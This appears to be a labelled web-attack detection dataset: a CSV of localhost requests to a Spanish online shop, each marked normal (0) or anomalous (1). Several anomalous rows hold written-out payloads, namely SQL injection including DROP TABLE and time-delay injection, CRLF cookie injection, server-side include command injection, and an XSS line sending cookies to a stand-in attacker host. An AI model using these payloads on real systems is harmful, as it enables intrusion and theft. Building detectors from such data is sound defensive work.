URL,Target
http://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=Vino+Rioja&precio=85&cantidad=98&B1=A%F1adir+al+carrito%2520,1
http://localhost:8080/postinfo.html,1
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=4459&B1=Pasar+por+cajaSet-cookie%253A%2BTamper%253D1041264011025374727,1
http://localhost:8080/tienda1/imagenes/logo.gif,0
http://localhost:8080/tienda1/publico/productos.jsp,0
http://localhost:8080/tienda1/index.jsp,0
http://localhost:8080/tienda1/publico/pagar.jsp,1
http://localhost:8080/asf-logo-wide.Bak,1
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=clifford&pwd=3Ube3A&remember=off&B1=Entrar,0
http://localhost:8080/6909030637832563290.jsp.inc,1
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=tsolas&password=c3763ativa.m4n3e&nombre=Frida&apellidos=Llagostera+Llaveria&email=cockneys%40drae2.tl&dni=11939364H&direccion=Calle+Alava+17+12%3FC&ciudad=Sada&cp=25139&provincia=Zaragoza&ntc=754521418329140A&B1=Registrar,1
http://localhost:8080/tienda1/publico/vaciar.jsp,1
http://localhost:8080/tienda1/publico/vaciar.jsp,0
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precioA=6471&B1=Pasar+por+caja,1
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=arjun1&password=lan%24%CDa&nombre=Walkiria&apellidos=Tirado+Paulet&email=arlen%40cienciapolicial.va&dni=61317153G&direccion=Gongora%2C+129+&ciudad=Gabiria&cp=13333&provincia=Segovia&ntc=6277517976007301&B1A=Registrar,1
http://localhost:8080/tienda1.inc,1
http://localhost:8080/tienda1/publico/carrito.jsp,0
http://localhost:8080/tienda1/miembros/fotos.jsp,0
http://localhost:8080/tienda1/global/titulo.jsp,0
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=kajeejit&password=f8li48e3&nombre=Teo&apellidos=Cela+Uba&email=challee%40zonamodelos.co&dni=81547343S&direccion=Avenida+Rafael+Cabrera%2C+24%2C+8%3FG&ciudad=Santa+Coloma&cp=28820&provincia=Vizcaya&ntc=3655911674701564&B1=Registrar,0
http://localhost:8080/tienda1/miembros/imagenes/ogono.jpg.INC,1
http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=1,0
http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectassessionid%3D12312312%26+username%3D%3Cscript%3Edocument.location%3D%27http%3A%2F%2Fhacker+.example.com%2Fcgi-bin%2Fcookiesteal.cgi%3F%27%2B+document.cookie%3C%2Fscript%3E,1
http://localhost:8080/tienda1/publico/entrar.jsp,0
http://localhost:8080/tienda1/global/titulo.jsp,0
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=mueller&password=ENv94E8CIMi2N27&nombre=Lihue&apellidos=Ache&email=tomarken%40gestionsoftware.mhany%253F%250ASet-cookie%253A%2BTamper%253D5765205567234876235&dni=47828836Z&direccion=Dacil+Vilar+Borges+197%2C+&ciudad=Valle+de+Tobalina&cp=09611&provincia=Almer%EDa&ntc=7390983660334411&B1=Registrar,1
http://localhost:8080/webapp/examples/verify,1
http://localhost:8080/tienda1/publico/caracteristicas.jsp,1
http://localhost:8080/tienda1/miembros/imagenes/ogono.jpg,0
http://localhost:8080/tienda1/imagenes/2.gif,0
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=hakeem&pwd=7E2HEREd0962N&remember=off&B1=Entrar,0
http://localhost:8080/samples/isapi/drop.htm,1
http://localhost:8080/tienda1/global/estilos.css,0
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=3422&B1=Pasar+por+caja,0
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=marg&password=77603O8adA&nombre=Brayam&apellidos=Cheres+Ochoa&email=salvilla%40mtos.pr&dni=02124892Z&direccion=Petxina%2C+77%2C+2B&ciudad=Vallanca&cp=34475&provincia=Valencia&ntc=6113595872626667&B1=Registrar,0
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=niccolo&pwd=%2C1ar%27aj5&remember=on&B1=Entrar,1
http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=1,0
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25&password=segundar&nombre=Armelio&apellidos=Gochez&email=shankley%40discon.sz&dni=25054750E&direccion=C%2F+Fuente+Del+Rey%2C+S%2FN%2C+&ciudad=Gavilanes&cp=36110&provincia=Salamanca&ntc=2607422784974121&B1=Registrar,1
http://localhost:8080/tienda1/publico/caracteristicas.jsp,1
http://localhost:8080/tienda1/index.jsp,0
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=4975&B1=%3C%21--%23include+file%3D%22archivo_secreto%22+--%3E,1
http://localhost:8080/tienda1/publico/registro.jsp,1
http://localhost:8080/tienda1/publico/carrito.jsp,0
http://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg,0
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=dokken8&pwd=PaRLaNch%EDn&remember=%27%2C%270%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&B1=Entrar,1
http://localhost:8080/tienda1/6909030637832563290.jsp.INC,1
http://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombreA=Vino+Rioja&precio=100&cantidad=81&B1=A%F1adir+al+carrito,1
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=1368&B1=Confirmar,0
http://localhost:8080/tienda1/miembros/salir.jsp,0
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=lakhian&password=a7av5nc6&nombre=Deborah&apellidos=Celada+Lurhmann&email=reilly-pidgeon%40interpretacion-diccionario-y-significado-de-los-s&dni=29142280S&direccion=Carretera+7+Hasta+Km.+4+Rueda+5+13F&ciudad=Arcos+de+Jal%F3n&cp=16316&provincia=Zamora&ntc=8355546144248132&B1=Registrar,0
http://localhost:8080/tienda1/miembros/editar.jsp,1
http://localhost:8080/tienda1/index.jsp,0
http://localhost:8080/tienda1/global/titulo.jsp,0
http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=%4040,1
http://localhost:8080/tienda1/publico/pagar.jsp,1
http://localhost:8080/tienda1/publico/entrar.jsp,0
http://localhost:8080/tienda1/publico/pagar.jsp,0
http://localhost:8080/tienda1/publico/entrar.jsp,0
http://localhost:8080/portalAppAdmin/login.jsp,1
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=bartz&password=impunida&nombre=Eliberto&apellidos=Ba%F1os+Peleij%E0&email=luke%40barnizultravioleta.ar&dni=88597573D&direccion=Calle+Albacete%2C+83+&ciudad=Nevada&cp=28794&provincia=Ciudad+R%2F%3F.eal&ntc=4823016932298784&B1=Registrar,1
http://localhost:8080/tienda1/global/titulo.jsp,0
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=2694&B1=Pasar+por+caja,0
http://localhost:8080/tienda1/publico/registro.jsp,0
http://localhost:8080/_cti_pvt/linkinfo.cnf,1
http://localhost:8080/tienda1/publico/entrar.jsp,1
http://localhost:8080/tienda1/publico/registro.jsp,0
http://localhost:8080/tienda1/publico/autenticar.jsp,1
http://localhost:8080/tienda1/publico/anadir.jsp,1
http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=%27+AND+%271%27%3D%271,1
http://localhost:8080/tienda1/publico/vaciar.jsp,0
http://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg,0
http://localhost:8080/tienda1/publico/anadir.jsp?idA=2&nombre=Jam%F3n+Ib%E9rico&precio=39&cantidad=75&B1=A%F1adir+al+carrito,1
http://localhost:8080/tienda1/asf-logo-wide.gif,1
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=marv%7C&pwd=meitad&remember=off&B1=Entrar,1
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=%2Cclo%27ris&pwd=8s84i4imosa&remember=on&B1=Entrar,1
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrarany%253F%250D%250ASet-cookie%253A%2BTamper%253D1041264011025374727&login=popel&pwd=descomPaginar&remember=off&B1=Entrar,1
http://localhost:8080/tienda1/publico/registro.jsp,1
http://localhost:8080/tienda1/publico/anadir.jsp,1
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=rory&pwd=sa89g%F3n&remember=on&B1=Entrar,0
http://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg,0
http://localhost:8080/tienda1/imagenes/logo.gif,0
http://localhost:8080/tienda1/imagenes/1.gif,0
http://localhost:8080/tienda1/publico/pagar.jsp,1
http://localhost:8080/tienda1/index.jsp,0
http://localhost:8080/tienda1/publico/anadir.jsp,1
http://localhost:8080/tienda1/publico/caracteristicas.jsp,0
http://localhost:8080/tienda1/imagenes/cmenbul.gif,0
http://localhost:8080/tienda1/publico/registro.jsp,0
http://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg,0
http://localhost:8080/tienda1/imagenes/2.gif,0
http://localhost:8080/tienda1/imagenes/3.gif,0
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=zandra&password=deSAPloMar&nombre=Agenor&apellidos=Iraola+Rudi&email=chamberlain%40muevemiweb.al&dni=50604841B&direccion=Calle+Jaime+Ferranz+51+&ciudad=Castellanos+de+Zapardiel&cp=12163&provincia=Cuenca&ntc=8496429893525706&B1=Registrar,0
http://localhost:8080/tienda1/miembros/salir.jsp,0
http://localhost:8080/tienda1/publico/carrito.jsp,0
http://localhost:8080/tienda1/publico/anadir.jsp,1
http://localhost:8080/tienda1/publico/autenticar.jsp/.Bak,1
http://localhost:8080/tienda1/publico/pagar.jsp,1
http://localhost:8080/tienda1/publico/autenticar.jsp,1
http://localhost:8080/tienda1/miembros/salir.jsp,0
http://localhost:8080/tienda1/miembros/editar.jsp/asf-logo-wide.gif~,1
http://localhost:8080/tienda1/publico/vaciar.jsp,1
http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombreA=Queso+Manchego&precio=85&cantidad=92&B1=A%F1adir+al+carrito,1
http://localhost:8080/tienda1/publico/vaciar.jsp,1
http://localhost:8080/tienda1/publico/entrar.jsp,0
http://localhost:8080/tienda1/publico/vaciar.jsp?B2=%27%2C%270%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--,1
http://localhost:8080/tienda1/imagenes/3.gif.Bak,1
http://localhost:8080/tienda1/publico/vaciar.jsp,0
http://localhost:8080/tienda1/publico/anadir.jsp,0
http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito,0
http://localhost:8080/tienda1/index.jsp,0
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=schmoe&password=7zNaLLo&nombre=Teo&apellidos=Corcoy+Augu%E9&email=mori%40itrends.do&dni=86953454E&direccion=Calle+Espiel+71+&ciudad=Valpalmas&cp=36668&provincia=Alicante&ntc=8781236153256548&B1=Registrar,0
http://localhost:8080/tienda1/miembros/editar.jsp,1
http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=2,0
http://localhost:8080/tienda1/publico/productos.jsp,0
http://localhost:8080/tienda1/publico/registro.jsp,0
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar%3F&precio=8384&B1=Confirmar,1
http://localhost:8080/tienda1/miembros/imagenes/ogono.jpg,0
http://localhost:8080/iissamples/ExAir/About.asp,1
http://localhost:8080/tienda1/miembros/fotos.jsp,0
http://localhost:8080/tienda1/imagenes/cmenbul.gif,0
http://localhost:8080/tienda1/imagenes/1.gif,0
http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas,0
http://localhost:8080/tienda1/global/estilos.css,0
http://localhost:8080/tienda1/miembros/fotos.jsp,0
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=rurick5&password=par4u8i67t3&nombre=Ros%E1ngela&apellidos=Branchadell+Arribas&email=pelletier%40cementosanfranq.hu&dni=66702102D&direccion=Comandante+Barja+84%2C+&ciudad=Cubillas+de+Santa+Marta&cp=24443&provincia=Toledo&ntc=0227003559920538&B1=Registrar,0
http://localhost:8080/tienda1/publico/anadir.jsp?idA=1&nombre=Queso+Manchego&precio=85&cantidad=20&B1=A%F1adir+al+carrito,1
http://localhost:8080/tienda1/global/creditos.jsp,0
http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=Vino+Rioja&precio=39&cantidad=35&B1=A%F1adir+al+carrito,0
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=mulroney&password=des4718o&nombre=Fares&apellidos=Osa+Matiz&email=lahiri%40martosfutbolsala.mk&dni=96676664M&direccion=Calle+Juan+Correa+De+Vivar+38+1%3FF&ciudad=Cueva+del+Hierro&cp=34127&provincia=Navarra&ntc=291239717167592A&B1=Registrar,1
http://localhost:8080/tienda1/imagenes/3.gif,0
http://localhost:8080/tienda1/global/creditos.jsp,0
http://localhost:8080/tienda1/publico/caracteristicas.jsp,0
http://localhost:8080/tienda1/miembros/imagenes/castro.jpg,0
http://localhost:8080/tienda1/miembros/imagenes/castro.jpg,0
http://localhost:8080/tienda1/imagenes/1.gif,0
http://localhost:8080/tienda1/publico/entrar.jsp,0
http://localhost:8080/tienda1/publico/autenticar.jsp,1
http://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=Queso+Manchego&precio=39%2F&cantidad=6&B1=A%F1adir+al+carrito,1
http://localhost:8080/tienda1/publico/caracteristicas.jsp,0
http://localhost:8080/tienda1/global/titulo.jsp,0
http://localhost:8080/tienda1/imagenes/1.gif,0
http://localhost:8080/tienda1/publico/miembros.jsp,0
http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=Jam%F3n+Ib%E9rico&precio=85&cantidad=80&B1=A%F1adir+al+carrito,0
http://localhost:8080/tienda1/publico/entrar.jsp,1
http://localhost:8080/tienda1/miembros/imagenes/castro.jpg,0
http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito,0
http://localhost:8080/tienda1/miembros/salir.jsp,0
http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=kalwarow3&password=enJuicia%2FmIento&nombre=Atico&apellidos=Planells+Teixid%F3&email=csikos%40newcosl.gr&dni=52594102W&direccion=Calle+Arcediano+Lopez+Cabezas%2C+184%2C+3%3FE&ciudad=B%E9rchules&cp=37405&provincia=Valladolid&ntc=7952567249623331&B1=Registrar,1
http://localhost:8080/tienda1/global/menum.jsp,0
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=englert&pwd=75n63d25&remember=on&B1=Entrar,0
http://localhost:8080/tienda1/publico/caracteristicas.jsp,1
http://localhost:8080/tienda1/publico/autenticar.jsp,1
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=cairisti&password=0a31e7a4&nombre=Luciano&apellidos=%C1vila+Kusanovic&email=moston%40sierradealcaraz.sg&dni=78128253J&direccion=Moncayo+46%2C+&ciudad=Cigudosa&cp=02649&provincia=Huesca&ntc=2771560137305516&B1=Registrar,0
http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas,0
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=3702&B1=Pasar+por+caja,0
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=any%253F%250ASet-cookie%253A%2BTamper%253D5765205567234876235&login=elsa&pwd=permanecer&remember=off&B1=Entrar,1
http://localhost:8080/tienda1/publico/anadir.jsp,0
http://localhost:8080/tienda1/miembros/imagenes/ogono.jpg,0
http://localhost:8080/tienda1/index.jsp,0
http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito,0
http://localhost:8080/tienda1/imagenes/nuestratierra.jpg,0
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=401%22%3E%3C%21--%23EXEC+cmd%3D%22dir+%22--%3E%3C&B1=Pasar+por+caja,1
http://localhost:8080/tienda1/miembros/editar.jsp,0
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=3587&B1=Pasar+por+caja%2F,1
http://localhost:8080/tienda1/miembros/fotos.jsp,0
http://localhost:8080/tienda1/publico/caracteristicas.jsp?idA=2,1
http://localhost:8080/tienda1/publico/autenticar.jsp,1
http://localhost:8080/tienda1/publico/vaciar.jsp,0
http://localhost:8080/tienda1/imagenes/nuestratierra.jpg,0
http://localhost:8080/tienda1/publico/autenticar.jsp/asf-logo-wide.gif/,1
http://localhost:8080/tienda1/publico/entrar.jsp,1
http://localhost:8080/tienda1/global.INC,1
http://localhost:8080/tienda1/imagenes/logo.gif,0
http://localhost:8080/tienda1/imagenes/3.gif,0
http://localhost:8080/tienda1/publico/vaciar.jsp?B2A=Vaciar+carrito,1
http://localhost:8080/tienda1/imagenes/nuestratierra.jpg,0
http://localhost:8080/tienda1/global/menum.jsp,0
http://localhost:8080/tienda1/miembros/editar.jsp,0
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=byoungin&pwd=agnac5%F3n&remember=off&B1=Entrar,0
http://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg,0
http://localhost:8080/tienda1/imagenes/cmenbul.gif,0
http://localhost:8080/tienda1/global/titulo.jsp,0
http://localhost:8080/tienda1/miembros/imagenes/ogono.jpg,0
http://localhost:8080/tienda1/publico/productos.jsp,0
http://localhost:8080/tienda1/miembros/fotos.jsp,0
http://localhost:8080/tienda1/global/titulo.jsp,0
http://localhost:8080/tienda1/miembros/imagenes/castro.jpg,0
http://localhost:8080/tienda1/imagenes/logo.gif,0
http://localhost:8080/tienda1/imagenes/nuestratierra.jpg,0
http://localhost:8080/tienda1/imagenes/nuestratierra.jpg,0
http://localhost:8080/_vti_bin/,1
http://localhost:8080/tienda1/publico/pagar.jsp.java,1
http://localhost:8080/tienda1/global/menum.jsp,0
http://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg,0
http://localhost:8080/tienda1/publico/anadir.jsp,1
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=3212&B1=Confirmar%2F,1
http://localhost:8080/tienda1/global/titulo.jsp,0
http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=Vino+Rioja&precio=100%2F&cantidad=25&B1=A%F1adir+al+carrito,1
http://localhost:8080/tienda1/global/estilos.css,0
http://localhost:8080/tienda1/miembros/salir.jsp,0
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=staci&pwd=e906aci%F39&remember=on&B1=Entrar,0
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=ryan&pwd=fErrErUelO&remember=off&B1=Entrar,0
http://localhost:8080/tienda1/publico/registro.jsp,1
http://localhost:8080/tienda1/global/menum.jsp,0
http://localhost:8080/tienda1/publico/autenticar.jsp,1
http://localhost:8080/tienda1/global/estilos.css,0
http://localhost:8080/tienda1/publico/productos.jsp,0
http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=1,0
http://localhost:8080/tienda1/publico/caracteristicas.jsp,0
http://localhost:8080/tienda1/global/menum.jsp,0
http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=1%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--,1
http://localhost:8080/tienda1/miembros/imagenes/asf-logo-wide.gif,1
http://localhost:8080/tienda1/global/titulo.jsp,0
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar%4040&login=carolien&pwd=p68vILl7Ja6&remember=on&B1=Entrar,1
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=charko&password=entrevenimiento&nombreA=Cayetano&apellidos=Papiol+Garriga&email=ruehmann.goodrow%40cajucar.bz&dni=75246757A&direccion=C%2F+Sierra+Maigmo%2C+S%2FN%2C+1%3FD&ciudad=Villa+de+Ves&cp=09343&provincia=Guadalajara&ntc=1828745224462815&B1=Registrar,1
http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=2%27INJECTED_PARAM,1
http://localhost:8080/tienda1/imagenes/3.gif,0
http://localhost:8080/tienda1/imagenes/2.gif,0
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=wei&password=yaguan%E9&nombre=Estefan&apellidos=Tomasa+Camino&email=bovell_haygarth%40nuestrasantacruz.vu&dni=75996092K&direccion=Guadiana+S%2FN+2%3FC&ciudad=Ossa+de+Montiel&cp=08470&provinciaA=Badajoz&ntc=4288323841686638&B1=Registrar,1
http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=1840&B1=Confirmar,0
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=souren&password=P811S25&nombre=Sisebuto&apellidos=Fincias+Alcoriza&email=diccico_pastor%40a%F1o09.io&dni=80914738W&direccion=C%2F+Altamira+179%2C+&ciudad=Almaluez&cp=45789&provincia=Sevilla&ntc=1714562160313645&B1=Registrar,0
http://localhost:8080/tienda1/miembros/fotos.jsp,0
http://localhost:8080/tienda1/publico/autenticar.jsp,0
http://localhost:8080/tienda1/publico/anadir.jsp,1
http://localhost:8080/tienda1/publico/autenticar.jsp,1
http://localhost:8080/tienda1/global/estilos.css,0
http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=natiuk&pwd=pesado&remember=on&B1=Entrar,0
http://localhost:8080/tienda1/index.jsp,0
http://localhost:8080/tienda1/publico/caracteristicas.jsp,0
http://localhost:8080/tienda1/miembros/index.jsp,0
http://localhost:8080/tienda1/global/titulo.jsp,0
http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=dongmoon&passwordA=va7icinio&nombre=Amru&apellidos=Corado+Bon%EDas&email=kempson%40ajuntamentbcn20.pw&dni=41944516Z&direccion=Gran+passeig+De+Ronda%2C+34%2C+&ciudad=Laroya&cp=12170&provincia=%C1vila&ntc=2439487997565772&B1=Registrar,1
